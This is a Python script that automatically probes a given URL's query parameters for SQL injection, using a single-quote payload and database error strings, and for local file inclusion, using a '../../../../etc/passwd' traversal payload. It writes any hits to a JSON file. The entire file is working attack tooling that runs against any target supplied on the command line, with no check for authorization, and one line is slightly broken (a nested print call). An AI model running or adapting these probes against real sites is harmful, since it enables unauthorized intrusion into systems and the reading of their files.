import sys
import urllib.parse
import urllib.request
import json

def auto_discover(url):
    print("=" * 65)
    print(f" [*] AUTOMATED PARAMETER DISCOVERY & TRIAGE: {url}")
    print("=" * 65)
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print("[-] No query parameters found in URL to analyze.")
        return []

    discovered_vulns = []
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in params.keys():
        print(f"[*] Testing parameter: '{param}'")
        orig_val = params[param][0]
        
        # 1. Test for SQL Injection (SQLi)
        sqli_query = parsed.query.replace(f"{param}={orig_val}", f"{param}={orig_val}'")
        sqli_url = f"{base_url}?{sqli_query}"
        
        try:
            req = urllib.request.Request(sqli_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                if any(err in body.lower() for err in ["sql syntax", "mysql", "syntax error", "sqlite", "postgresql", "unterminated"]):
                    print(f"    [!] VULNERABILITY FOUND: SQLi on parameter '{param}'")
                    discovered_vulns.append({
                        "target": url,
                        "param": param,
                        "vulnerability": "SQLi"
                    })
                    continue
        except Exception:
            pass

        # 2. Test for Local File Inclusion (LFI)
        lfi_query = parsed.query.replace(f"{param}={orig_val}", f"{param}=../../../../etc/passwd")
        lfi_url = f"{base_url}?{lfi_query}"
        
        try:
            req = urllib.request.Request(lfi_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                if "root:x:0:0" in body:
                    print(f"    [!] VULNERABILITY FOUND: LFI on parameter '{param}'")
                    discovered_vulns.append({
                        "target": url,
                        "param": param,
                        "vulnerability": "LFI"
                    })
                    continue
        except Exception:
            pass

        print(print(f"    [-] Parameter '{param}' appeared secure or unexploited by baseline probes."))

    return discovered_vulns

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python auto_discover.py <url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    results = auto_discover(target_url)
    
    if results:
        with open("scan_results.json", "w") as f:
            json.dump(results, f, indent=4)
        print(f"\n[+] Success! {len(results)} vector(s) automatically saved to scan_results.json")
    else:
        print("\n[-] No vulnerabilities automatically identified on this target.")

